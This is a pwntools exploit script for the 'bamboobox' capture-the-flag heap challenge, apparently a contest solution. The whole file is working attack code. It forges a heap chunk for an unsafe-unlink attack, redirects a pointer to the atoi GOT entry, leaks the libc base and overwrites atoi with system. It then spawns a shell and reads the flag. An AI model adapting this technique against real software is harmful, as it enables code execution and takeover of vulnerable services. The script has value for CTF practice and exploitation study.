from pwn import *
LOCAL = False
binary = './bamboobox'

def pause():
    if LOCAL:
        raw_input('pause')
    else:
        sleep(0.2)

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10138)

context.arch = 'amd64'
elf = ELF(binary, checksec=False)
libc = ELF('libc.so.6', checksec=False)

def show():
    r.recvuntil(":")
    r.sendline("1")

def add(size, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)

def change(idx, size, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)

def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

add(0x80, 'a')
add(0x80, 'a')
add(0x80, 'a')

r_addr = 0x6020d8
# chunck 1
chunk = p64(0) + p64(0x81) # prev, size
chunk += p64(r_addr-0x18) + p64(r_addr-0x10) # fd, bk
chunk += 'A' * 0x60
# chuck 2
chunk += p64(0x80) + p64(0x90)
change(1, 0x100, chunk)
remove(2)

atoi_got = elf.got['atoi']
change(1, 0x100, p64(0) + p64(atoi_got))
show()
r.recvuntil(" : ")
libc_base = u64(r.recvuntil("1 : ")[:-4].ljust(8,'\x00')) - libc.symbols['atoi']
print "libc_base:", hex(libc_base)

change(0, 0x100, p64(libc_base+libc.symbols['system']))

r.sendline('sh')
pause()
r.sendline('cat /home/`whoami`/flag')
r.interactive()
